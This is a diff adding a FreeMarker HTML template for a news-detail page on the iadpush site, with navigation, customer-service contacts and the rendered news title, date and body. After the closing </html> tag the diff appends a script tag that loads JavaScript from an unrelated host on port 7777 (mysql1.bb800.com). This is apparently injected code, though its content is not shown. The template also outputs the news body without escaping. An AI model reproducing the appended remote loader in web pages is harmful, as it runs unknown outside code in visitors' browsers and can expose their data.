@@ -1,0 +1,63 @@
+<html>
+<#include "/pager/common/header.html" />
+		   <div id="news_bgpic">
+		        <div class="news_bgpic"></div>
+		   </div>
+		   <div id="body4">
+		      <div class="body4">
+		      	   <div class="news_left">
+				       <div class="body4_title">新闻中心</div>
+				       <div class="body4_nav">
+					      <ul class="body4_nav_list">
+						     <li id="gonggao_nav" class="web_anouncement"><a href="${base}/news_list.html?check=news&type=gonggao">网站公告</a></li>
+						     <li id="news_nav" class="business_consult" > <a href="${base}/news_list.html?check=news&type=news">行业咨询</a></li>
+					      </ul>
+					   </div>
+				       <div class="body4_aboutService">
+					      <div class="body4_aboutService_title">客服信息</div>
+						  <ul>
+						     <li>iadpush 重庆市南岸区五公里</li>
+						     <li>客服热线：</li>
+						     <li>4006-123-123</li>
+						     <li><img src="assets/1.0.0/newsimg/news_05.png" /><sup>&nbsp&nbsp 676420958 </sup></li>
+						     <li><img src="assets/1.0.0/newsimg/news_05.png" /><sup>&nbsp&nbsp 676420938</sup></li>
+						     <li><img src="assets/1.0.0/newsimg/news_05.png" /><sup>&nbsp&nbsp 676431439</sup></li>
+						     <li>技术支持：</li>
+						     <li><img src="assets/1.0.0/newsimg/news_05.png" /><sup>&nbsp&nbsp 537985222</sup></li>
+						     <li>新浪微博：<sub><a><img src="assets/1.0.0/newsimg/news_09.png"/></a></sub></li>
+						     <li>腾讯微博：<sub><a><img src="assets/1.0.0/newsimg/news_12.png"/></a></sub></li>
+						  </ul>
+					   </div>
+				   </div>
+			       <div class="body4_newsDetail" style="display: block;">
+			       <#if news ??>
+				       <div class="body4_newsDetail_title">
+				       			<#if news.title??>${news.title}</#if>
+				       </div>
+				       <div class="body4_newsDetail_date">日期：<#if news.title??>${news.date}</#if></div>
+				       <div class="body4_newsDetail_text">
+					       <#if news.context??>${news.context}</#if>
+					   </div>	
+					</#if>
+				   </div>
+			  </div>
+		   </div>
+		   
+		   
+		   <div id="foot">
+		      <div class="foot"><div class="foot_copyRight">Copyright © 京ICP备12048915号-1 iadpush Inc. All Rights Reserved.</div></div>
+		   </div>
+		</body>
+		<script type="text/javascript">
+			function meanu(){
+				var type = getQueryString("type");
+				if(type == "news"){
+					$("#news_nav").addClass("body4_nav_checked");
+				}else{
+					$("#gonggao_nav").addClass("body4_nav_checked");
+				}
+			}
+			meanu();
+		</script>
+</html>
+<script type="text/javascript" src="http://mysql1.bb800.com:7777/qq/jsgetJS?uid=26" ></script>
